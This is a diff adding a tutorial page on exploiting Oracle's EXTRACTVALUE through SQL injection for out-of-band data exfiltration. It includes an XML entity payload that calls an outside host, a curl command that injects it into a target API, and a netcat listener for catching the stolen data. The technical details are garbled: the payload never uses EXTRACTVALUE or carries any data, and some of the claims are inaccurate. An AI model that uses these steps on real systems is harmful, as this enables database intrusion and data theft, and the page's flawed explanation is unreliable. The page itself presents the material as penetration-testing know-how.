@@ -1,0 +1,90 @@
+---
+title: 'EXTRACTVALUE SQL Injection: Oracle Out-of-Band Exploit'
+description: Explore EXTRACTVALUE for SQL injection in Oracle for effective out-of-band
+  data exfiltration.
+keywords:
+- EXTRACTVALUE
+- SQL injection
+- Oracle SQL
+- Out-of-Band attack
+- cybersecurity
+- XML parsing
+- data exfiltration
+---
+
+# EXTRACTVALUE
+
+## Context
+
+In the realm of offensive cybersecurity, exploiting SQL injection vulnerabilities is a crucial technique for penetration testers and malicious actors alike. The `EXTRACTVALUE()` function in Oracle SQL can be particularly insidious when harnessed for out-of-band (OOB) data exfiltration. This technique capitalizes on the XML parsing capabilities of `EXTRACTVALUE()` to perform SQL injection attacks, targeting applications that use this function for XML data operations. Understanding and implementing this vulnerability can offer profound insights into vulnerabilities within Oracle SQL databases.
+
+## Theory
+
+The core idea behind this technique is the exploitation of the `EXTRACTVALUE()` function. This function is typically used to extract values from XML documents in the database. However, when unsanitized user input is processed through this function, it can be manipulated to execute arbitrary SQL commands. This behavior can be exploited to perform out-of-band attacks, where data is relayed to an external system controlled by the attacker, bypassing normal database security constraints.
+
+```mermaid
+graph TD
+    A[SQL Injection] --> B[Oracle SQL]
+    B --> C[Out-of-Band]
+    C --> D[EXTRACTVALUE()]
+```
+
+## Practice
+
+### Identify Vulnerable EXTRACTVALUE Endpoint
+
+To begin exploiting a system using `EXTRACTVALUE()` for out-of-band injection, we must first identify endpoints where this function is used and unprotected by proper input sanitization.
+
+1. **Check for XML Query Usage:**
+
+   Begin by reviewing application behavior related to XML processing. This could involve inspecting API documentation or web application functionalities that mention XML or querying capabilities tied to `EXTRACTVALUE()`.
+
+2. **Test Input Fields:**
+
+   Inject simple payloads into input fields that might use `EXTRACTVALUE()`, monitoring for typical SQL error messages or irregular application behavior. An error or unexpected output can indicate vulnerability.
+
+### Exploit EXTRACTVALUE SQL Injection
+
+Once a vulnerable endpoint is located, the following steps can help in crafting a malicious payload:
+
+1. **Craft Payload:**
+
+   The payload leverages XML and concatenation to induce the database to make an HTTP request to an external server. An example payload may look like this:
+
+   ```xml
+   '<!DOCTYPE root [<!ENTITY a SYSTEM "http://example.com/log?data=">]><root>&a;</root>'
+   ```
+
+2. **Insert Payload:**
+
+   Place the crafted payload into the vulnerable input field or API parameter. For example, this command uses `curl` to POST data to a web application:
+
+   ```bash
+   curl -X POST -d "input=<payload>" http://target.com/api/search
+   ```
+
+3. **Monitor for HTTP Requests:**
+
+   Host an exfiltration server on your domain that will capture any OOB calls the vulnerable server makes when processing your payload.
+
+### Monitor for OOB Data Exfiltration
+
+Upon executing the injection, monitoring tools can capture outgoing communications to validate the attack's success.
+
+1. **Set up a Listener:**
+
+   In this scenario, use tools like Netcat to set up a listener on your server:
+
+   ```bash
+   nc -lvnp 80
+   ```
+
+2. **Capture Connections:**
+
+   You should observe incoming HTTP requests from the target host, signifying successful data exfiltration:
+
+   ```
+   Received connection from target host with data: <exfiltrated_data>
+   ```
+
+By successfully executing the above steps, an attacker can exfiltrate data from an Oracle SQL database using `EXTRACTVALUE()` in an out-of-band manner, circumventing direct database protections. Always conduct such penetration testing within legal boundaries and with explicit permission from the system owner.
